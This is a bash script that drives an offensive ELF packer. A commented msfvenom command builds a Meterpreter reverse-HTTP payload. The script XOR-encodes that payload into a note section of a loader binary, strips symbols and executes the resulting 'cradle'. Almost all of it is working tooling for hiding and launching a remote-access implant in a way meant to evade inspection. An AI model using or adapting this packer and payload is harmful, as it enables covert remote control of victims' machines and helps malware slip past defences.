#!/bin/bash

#msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf > /tmp/elf_loader/mettle-shell.elf

BUILD_TARGET="Debug"
ELFPACK="./bin/${BUILD_TARGET}/elfpack"
ELFLDR="./bin/${BUILD_TARGET}/elfldr"

HOST_ELF_FILE=${ELFLDR}
WORK_DIR="/tmp/elf_loader"
DST_ELF_FILE="${WORK_DIR}/injected-cradle"  # Loader bootstrapping paylaod
PAYLOAD_FILE="${WORK_DIR}/mettle-shell.elf" # ELF payload

DST_ELF_SECTION=".note.gnu.buf[...]"
DST_ELF_META_ALGO="X"
DST_DESC_NAME=".rodata"
XOR_KEY=""

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
RESET=$(tput sgr0)



if [[ $# -eq 0 ]]
then
  echo "Need key. example ${0} 0x23"
  exit 1
fi

if [[ ! -d ${WORK_DIR} ]]
then
  mkdir -p ${WORK_DIR}
fi

XOR_KEY=$1

# Split arguments to injected cradle from the packer
PAY_OPTS=("$@")
PAY_OPTS=("${PAY_OPTS[@]:1}") # removes the first element


if [[ -f  $DST_ELF_FILE ]]
then
  /bin/rm $DST_ELF_FILE
fi



echo [TASK] "${GREEN}" ============= Packing with $ELFPACK ${RESET} ================
echo ${GREEN} host file ${HOST_ELF_FILE} with ${PAYLOAD_FILE} into ${DST_ELF_FILE} within section "${DST_ELF_SECTION}" \
  as record  ${DST_DESC_NAME}, algo ${DST_ELF_META_ALGO} with key: "${XOR_KEY}" ${RESET}

echo [CMD] ${RED} $ELFPACK ${HOST_ELF_FILE} ${PAYLOAD_FILE} ${DST_ELF_FILE} "${DST_ELF_SECTION}" ${DST_DESC_NAME} ${DST_ELF_META_ALGO} "${XOR_KEY}" ${RESET}
$ELFPACK ${HOST_ELF_FILE} ${PAYLOAD_FILE} ${DST_ELF_FILE} "${DST_ELF_SECTION}" ${DST_DESC_NAME} ${DST_ELF_META_ALGO} "${XOR_KEY}"

echo [TASK] ${GREEN} ============= Stripping symbols but not sections ${RESET} ==================
echo [CMD] ${RED} strip $DST_ELF_FILE ${RESET}
strip $DST_ELF_FILE

echo [TASK] ${GREEN} ============= Executing $DST_ELF_FILE ${RESET} ==============
echo [CMD] ${RED} chmod +rx $DST_ELF_FILE '&&'  $DST_ELF_FILE  "${PAY_OPTS[@]}" ${RESET}
chmod +rx $DST_ELF_FILE

echo "Command to launch :" $DST_ELF_FILE  "${PAY_OPTS[@]}"
echo "Setup is done, ready to launch? <ENTER>"
read -r

$DST_ELF_FILE  "${PAY_OPTS[@]}"

